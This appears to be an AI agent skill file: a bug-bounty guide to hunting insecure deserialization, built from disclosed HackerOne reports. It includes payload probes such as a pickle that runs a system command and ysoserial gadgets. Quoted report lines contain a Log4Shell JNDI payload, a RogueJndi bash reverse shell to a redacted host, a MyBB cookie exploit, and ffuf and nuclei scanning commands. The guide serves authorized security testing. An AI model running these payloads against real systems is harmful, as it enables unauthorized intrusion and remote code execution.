---
name: hackerone-deserialization
description: >-
  Hunt insecure deserialization. Use when testing cookies, tokens, caches, RPC, and language-native object formats. Backed by 93 disclosed HackerOne reports.
---

# Insecure Deserialization — HackerOne field guide

Built from **93** publicly disclosed HackerOne reports (2015–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **93** · paid: **27**
- Median bounty **$600** · p90 **$4,500** · max **$10,000** · total **$50,091**
- Median upvotes **16**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub Security Lab | 6 | $17,100 | 57 |
| Pornhub | 1 | $10,000 | 271 |
| Internet Bug Bounty | 22 | $8,323 | 217 |
| Aiven Ltd | 1 | $5,000 | 45 |
| 8x8 | 2 | $3,000 | 85 |
| Vanilla | 4 | $2,100 | 120 |
| RubyGems | 2 | $1,500 | 79 |
| Acronis | 1 | $1,000 | 76 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.
- Decode cookies/params; identify magic bytes (rO0, a:, 8004, etc.).
- Test gadget chains in an authorized, controlled way.
- Check integrity/signature validation and key management.
- Look at queues, caches, and session stores.

## Payloads & probes

- Java -> `rO0AB...` + ysoserial gadget
- PHP -> `O:8:"stdClass":...`
- Python -> `cos\nsystem\n(S'id'\ntR.` pickle
- Ruby -> `\x04\b[` Marshal

## Bypass tricks

- Signed cookies with a weak/known key.
- Filter bypass via encoding or nested serialization.
- Use DNS/HTTP callbacks to confirm gadget execution.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cookie` `session` `token` `state` `data` `job` `queue` `cache`

## Tools

`ysoserial` · `phpggc` · `marshalsec` · `Burp` · `interactsh`

## Escalation chains

- Deserialization -> RCE.
- Deserialization -> auth bypass.

## Deeper checklist

- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.
- Decode cookies/params and identify magic bytes and object structure.
- Test gadget chains with ysoserial/phpggc in a safe, authorized manner.
- Check integrity/signature validation and key management.
- Look for deserialization in message queues, caches, and session stores.
- Demonstrate a controlled impact (DNS callback or command execution).

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Attacker can add arbitrary data to the blockchain without paying gas** — `#396954` · Rootstock Labs · $0 · ▲258
  > https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java L242
- **Account takeover via insecure intent handling** — `#2516732` · Basecamp · $0 · ▲136
  > By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account.
- **SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai** — `#1842674` · Krisp · $0 · ▲119
  > [tenweb-speed-optimizer](https://wordpress.org/plugins/tenweb-speed-optimizer/) wordpress plugin by [10web.io](https://10web.io/), prior to 2.12.22 version was vulnerable to UNAUTHENTICATED SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be…
- **Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]** — `#453791` · PayPal · $0 · ▲93
  > https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/
- **Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce** — `#403083` · Automattic · $0 · ▲84
  > I only displayed the contents of the /etc/passwd file in the PoC video.
- **RCE on Wordpress website** — `#2248328` · Nextcloud · $0 · ▲83
  > https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php L431
- **Two click Account Takeover** — `#3079738` · Basecamp · $0 · ▲77
  > The vulnerability specifically occurs in the `MainActivity` component when processing deeplinks with URL extras containing specific query parameters.
- **[CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day** — `#1425474` · Acronis · $1,000 · ▲76
  > Construct the payload: `${jdni:ldap://nps.acronis.com.<your-server /test}`
- **GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]** — `#198734` · Internet Bug Bounty · $0 · ▲68
  > This means the `$templates` object's handle was set to 5 and stored into objects store, so we can access the `$templates` object and update the `$cache` property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization.
- **insecure deserilize object leads to RCE On Sitecore (CVE-██████████-27218)** — `#3090123` · Mars · $0 · ▲59
  > The vulnerability allows remote code execution (RCE) through unsanitized user input in the ThumbnailsAccessToken header.
- **CVE-2025-24813: Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet** — `#3031518` · Internet Bug Bounty · $4,323 · ▲56
  > - writes enabled for the default servlet (disabled by default)
- **Remote Code Execution through DNN Cookie Deserialization** — `#876708` · U.S. Dept Of Defense · $0 · ▲56
  > You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the…
- **Unsafe yaml load can lead to remote code execution** — `#2467232` · Liberapay · $0 · ▲55
  > https://github.com/liberapay/liberapay.com/blob/master/liberapay/testing/vcr.py L40
- **Remote code execution on rubygems.org** — `#274990` · RubyGems · $1,500 · ▲51
  > When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`.
- **connect.8x8.com: Deserialization Vulnerability  in Automation Builder via Jint→Newtonsoft serializer coercion (TypeNameHandling)** — `#3861550` · 8x8 · $3,000 · ▲49
  > By providing a specially crafted JSON response, an authenticated user could coerce Jint's overload resolution to construct a `JsonSerializer` with attacker-controlled `TypeNameHandling` settings, enabling deserialization of arbitrary .NET types including…
- **Java Deserialization RCE via JBoss on card.starbucks.in** — `#221294` · Starbucks · $0 · ▲48
  > The researcher discovered that a Starbucks online system running on the domain `http://card.starbucks.in/` performs deserialization of java objects that are submitted by users on a specific path belonging to JBOSSMQ without sanitizing/validating the data.
- **CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci** — `#2762119` · MTN Group · $0 · ▲46
  > If everything goes well, following request will return content of win.ini file in response body.
- **Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration** — `#1529790` · Aiven Ltd · $5,000 · ▲45
  > Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS} &/dev/tcp/███/4445<&1"`
- **Loading YAML in Java client can lead to command execution** — `#1167773` · Kubernetes · $1,000 · ▲45
  > I wrote a small post about this report on my blog, you can find it here: https://j0vsec.com/post/cve-2021-25738/
- **Remote Code Execution via Insecure Deserialization in Telerik UI** — `#838196` · U.S. Dept Of Defense · $0 · ▲45
  > - The `sleep 042020160430,40 amd64.dll` is supposed to Sleep(10).
- **Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet on card.starbucks.in** — `#153026` · Starbucks · $0 · ▲42
  > Invokers: https://card.starbucks.in/invoker/EJBInvokerServlet and https://card.starbucks.in/invoker/JMXInvokerServlet
- **[Switch, PIA/MK8DX] Stack buffer overflow and potential RCE in PIA (LAN/LDN, possibly NEX) room info deserialization** — `#2611669` · Nintendo · $0 · ▲36
  > A vulnerability was discovered in Mario Kart 8 Deluxe's incorrect usage of the [`Pia`](https://github.com/kinnay/NintendoClients/wiki/Pia-Overview) P2P networking library, in which implementations of "`CopyAppData`" (See pseudocode below) are sometimes called…
- **Remote Code Execution on ██.8x8.com via .NET VSTATE Deserialization** — `#1391576` · 8x8 · $0 · ▲36
  > Insert payload into ` VSTATE` parameter on the page.
- **CVE-2023-46132** — `#2255968` · Linux Foundation Decentralized Trust · $0 · ▲34
  > `|$$$$$$$$$$$$| |@@@@@@@@@@@@|%%%%%%%%%|` (The vertical lines " | " represent how transactions are separated in a block.)
- **Navgraph confusion allows any 3p app to send and read requests from the server at app.hey.com** — `#2552879` · Basecamp · $0 · ▲31
  > It is possible to send authenticated requests to the server at app.hey.com and read the server's reply by running a malicious app in the same device as the HEY app.
- **RCE via exposed JMX server on jabber.37signals.com/jabber.basecamp.com** — `#1456063` · Basecamp · $100 · ▲30
  > @ian reported that `jabber.37signals.com` and `jabber.basecamp.com` exposed on port `555` an unauthenticated Java JMX server which was vulnerable to RCE.
- **[HTAF4-213] [Pre-submission] Unsafe AMF deserialization (CVE-2017-5641) in Apache Flex BlazeDS at the https://www.███████/daip/messagebroker/amf** — `#728614` · U.S. Dept Of Defense · $0 · ▲28
  > We identified potential unsafe deserialization vulnerability on the `https://www.█████/daip/messagebroker/amf` endpoint.
- **Bundler's RCE with response using Marshal** — `#1119120` · RubyGems · $0 · ▲28
  > In `GET /api/v1/dependencies`, which Bundler uses to check dependencies, the response is `Marshal.dump` instead of `JSON`.
- **Arbitrary File delete via PHAR deserialization** — `#921288` · Concrete CMS · $0 · ▲28
  > With the parameter of filesystem function (`file exists()`, `is dir()`, etc.) under control, this method can be used with `phar://` pseudo-protocol to directly perform deserialization without relying on `unserialize()`[2].
- **Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)** — `#1174185` · U.S. Dept Of Defense · $0 · ▲27
  > This uploads a file (in this case, `testfile.txt`) to the `█████` directory on the target server.

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 3× | `$templates` |
| 3× | `__proto__` |
| 2× | `$cache` |
| 2× | `curl -v \ / --proxy https://127.0.0.1:18443 --proxy-insecure \ / --hsts ./hsts-cache.txt \ / http://hsts-probe.test:18080/` |
| 2× | `cf_ssl_is_alive()` |
| 1× | `system('id')` |
| 1× | `$_COOKIE['nc_form_fields']` |
| 1× | `${jdni:ldap://nps.acronis.com.<your-server>/test}` |
| 1× | `ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ / { / zend_object *zobj; / zobj = Z_OBJ_P(object); / if (!zobj` |
| 1× | `curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12` |
| 1× | `Gem::Package.new(body).spec` |
| 1× | `PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini` |
| 1× | `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1` |
| 1× | `\\| Packet type (` |
| 1× | `\\|$$$$$$$$$$$$\\|*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |
| 1× | `$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%` |
| 1× | `\\|$$$$$$$$$$$$*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |
| 1× | `POST /daip/messagebroker/amf HTTP/1.1 / Host: www.███████ / Connection: close / Accept-Encoding: gzip, deflate / Accept: */* / User-Agent: p` |
| 1× | `script.py <collaborator> 80` |
| 1× | `❯ RUBYGEMS_PROXY=true rackup / Puma starting in single mode... / * Puma version: 5.2.2 (ruby 2.7.1-p83) ("Fettisdagsbulle") / * Min threads:` |

## Parameters observed

`id` · `type` · `qid` · `scoretype` · `f.input`

## Case studies

### Attacker can add arbitrary data to the blockchain without paying gas
`#396954` · Rootstock Labs · $0 · critical · 2019-09-18 · ▲258
> Summary: Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.

### Account takeover via insecure intent handling
`#2516732` · Basecamp · $0 · medium · 2024-05-30 · ▲136
> By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account.

### SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai
`#1842674` · Krisp · $0 · critical · 2023-02-22 · ▲119
> tenweb-speed-optimizer wordpress plugin by 10web.io, prior to 2.12.22 version was vulnerable to UNAUTHENTICATED SQL injection (in /wp-json/tenwebio/v2/compress-one) which could be chained with insecure deserialization in the plugin to gain RCE. Vendor published the issue as an "authenticated" one (update: wordfence team corrected it !) - here. We would like to thank @mikemyers for reporting it responsibly to us.

### Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]
`#453791` · PayPal · $0 · medium · 2021-04-30 · ▲93
> A Bug Bounty researcher identified an issue where a JSON wrapper could be used to instantiate arbitrary Java objects. This could lead to circumstances where a class called in the PayPal Android app could be read by a malicious app on the same mobile device. A specific user’s session data could potentially be disclosed, including API tokens. PayPal’s investigation found no evidence of abuse due to this bug, and the issue was resolved on November 15, 2019.

### Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce
`#403083` · Automattic · $0 · high · 2019-12-19 · ▲84
> This vulnerability is based on the following exploitation technique: https://blog.ripstech.com/2018/new-php-exploitation-technique/ It is easier to explain this vulnerability by having watched the PoC first: https://www.youtube.com/watch?v=mr3bAOIUwd4 Here is what's happening: 1. Since a valid phar file needs o be uploaded to the server (the extension doesn't matter) I upload the poc.jpg via the media uploader 2.

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_deserialization.txt` | 76 |
| `~/.local/share/hackerone-reports/wordlists/params_deserialization.txt` | 5 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_deserialization.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_deserialization.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

## Nuclei

Scanner coverage is thin; decode cookies/tokens and identify the serialization format manually.

```sh
nuclei -u https://target -tags deserialization \
       -severity low,medium,high,critical -rl 40 -o nuclei_deserialization.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
       -rl 40 -o nuclei_deserialization_other.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class deserialization --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class deserialization
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class deserialization
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class deserialization --min-bounty 1000
```

## Related

- `hackerone-rce` (1,399 reports)
- `hackerone-memory-corruption` (892 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
